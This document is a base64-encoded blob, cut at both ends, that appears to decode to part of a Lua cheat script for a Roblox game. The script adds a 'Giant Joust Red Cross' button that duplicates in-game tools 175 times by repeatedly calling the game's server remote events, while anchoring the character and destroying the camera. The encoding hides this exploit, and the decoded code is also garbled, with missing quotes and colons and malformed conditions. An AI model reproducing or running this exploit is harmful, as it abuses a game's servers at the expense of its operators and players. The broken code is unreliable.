CAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQodG9sbGxsYWhoaGgpID09IG5pbCB0aGVuIHRvb2xsbGxmb3VuMiA9IGZhbHNlIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0IHdhaXQoKSB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQodG9sbGxsYWhoaGgpID09IG5pbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsbGZvdW4yID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3YWl0KDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIG09MSwgZHVwZWFtb3QgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSlEZXN0cm95KCkgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG0gPSBkdXBlYW1vdCB0aGVuCiAgICAgICAgICAgICAgICBlbHNlaWYgbSA9PSBkdXBlYW1vdCBvciBtID0gZHVwZWFtb3QgLSAxIHRoZW4KICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWzFdID0gUGlja2luZ1Rvb2xzLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbMl0gPSB0b29sc2VsY3RlZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwaWNrdG9vbHJlbW90ZUludm9rZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5CYWNrcGFja1dhaXRGb3JDaGlsZCh0b29sc2VsY3RlZCkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UgcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbdG9vbHNlbGN0ZWRdRmluZEZpcnN0Q2hpbGQoSGFuZGxlKS5OYW1lID0gSOIgpWHiIKVu4iClZOIgpWziIKVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZCh0b29sc2VsY3RlZCkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5CYWNrcGFja0ZpbmRGaXJzdENoaWxkKHRvb2xzZWxjdGVkKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgICAgICAgICBpZiBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpRmluZEZpcnN0Q2hpbGQoQ2FtZXJhKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpRGVzdHJveSgpIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkgdW50aWwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKHRvb2xzZWxjdGVkKSA9PSBuaWwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpID09IG5pbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IG9sZGNmCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHoseCBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgeC5OYW1lID09IHRvb2xzZWxjdGVkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGFtb3V0aCA9IHoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGR1cGluZyA9IGZhbHNlCiAgIHdhaXQoMSkKCgpsb2NhbCBHcmlwUG9zVGFibGUgPSB7CiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMiwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygzLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNSwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg2LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDMsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDUsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDYsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDMsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDUsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDYsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDMsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDUsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDYsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDMsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDUsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDYsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMiAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTMgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC00ICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtNSAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTYgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC03ICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtOCAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTkgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMCAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTExICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTIgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMyAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE0ICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTUgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNiAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE3ICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTggLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOSAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTIwICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMjEgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMyAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg1ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNiAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDcgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg4ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoOSAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEwICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTEgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxMiAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEzICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTQgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxNSAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDE2ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTcgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxOCAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDE5ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjAgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyMSAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIyICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE2LCAzLCA0MyksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE3LCAzLCA0MyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTgsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOSwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTIwLCAzLCA0MyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMjEsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNiwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE1LCAzLCA0MyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTYsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE3LCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTgsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOSwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTIwLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMjEsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNiwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE1LCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygzLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg0LCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg1LCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg2LCAzLCA1NSksCiAgICAgICAgIFZlY3RvcjMubmV3KDIzICwgMywgNTUpLAogICAgICAgICBWZWN0b3IzLm5ldygyNCAsIDMsIDU1KSwKICAgICAgICAgIFZlY3RvcjMubmV3KDI1ICwgMywgNTUpLAogICAgICAgICAgIFZlY3RvcjMubmV3KDI2ICwgMywgNTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygyNyAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTIgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMyAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC00ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTUgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtNiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC03ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTggLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtOSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMyAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNyAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0yMCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0yMSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDMgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg0ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDYgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg3ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoOCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDkgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxMCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDExICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTIgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxMyAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDE0ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTUgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxNiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDE3ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTggLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxOSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIwICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjEgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyMiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIzICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjQgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyNSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI2ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjcgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyOCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI4LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI3LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI2LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI1LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI0LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIzLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIyLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIxLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIxLCAzLCAxNyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyMiwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjMsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI0LCAzLCAxNyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyNSwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjYsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI3LCAzLCAxNyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyOCwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpLCB0b29sIGluIHBhaXJzKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja0dldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2xJc0EoVG9vbCkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0gTW92ZSB0aGUgdG9vbCB0byB0aGUgcGxheWVyIGNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tIFNldHRpbmcgdGhlIGdyaXAgcG9zaXRpb24gaW5kZXgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGdyaXBQb3NJbmRleCA9IG1hdGgubWluKGksICNHcmlwUG9zVGFibGUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBncmlwUG9zID0gR3JpcFBvc1RhYmxlW2dyaXBQb3NJbmRleF0KICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tIFNldCB0aGUgZ3JpcCBwb3NpdGlvbiAoR3JpcFBvcykgaWYgdGhlIHRvb2wgaXMgaW4gdGhlIHBsYXllcidzIGNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG9vbElzRGVzY2VuZGFudE9mKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sLkdyaXBQb3MgPSBncmlwUG9zCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2FybihUb29sLCB0b29sLk5hbWUsIGlzIG5vdCBpbiBjaGFyYWN0ZXIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIEJ1dHRvbiBmb3IgR2lhbnQgSm91c3QgUmVkIENyb3NzClRvb2xzVGFiQWRkQnV0dG9uKHsKICAgIE5hbWUgPSBHaWFudCBKb3VzdCBSZWQgQ3Jvc3MsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICB0b29sc2VsY3RlZCA9IEpvdXN0UmVkCiAgICAgICAgZHVwZWFtb3QgPSAxNzUgLS1QdXQgYW1vdXRoIHRvIGR1cGUKICAgICAgICBwaWNrdG9vbHJlbW90ZSA9IGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKS5SRUZpbmRGaXJzdENoaWxkKDFUb28xbCkKICAgICAgICBjbGVhcnRvb2xyZW1vdGUgPSBnYW1lR2V0U2VydmljZShSZXBsaWNhdGVkU3RvcmFnZSkuUkVGaW5kRmlyc3RDaGlsZCgxQ2xlYTFyVG9vbDFzKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGR1cGluZyA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvbGRjZiA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKZ2FtZUdldFNlcnZpY2UoU3Rhc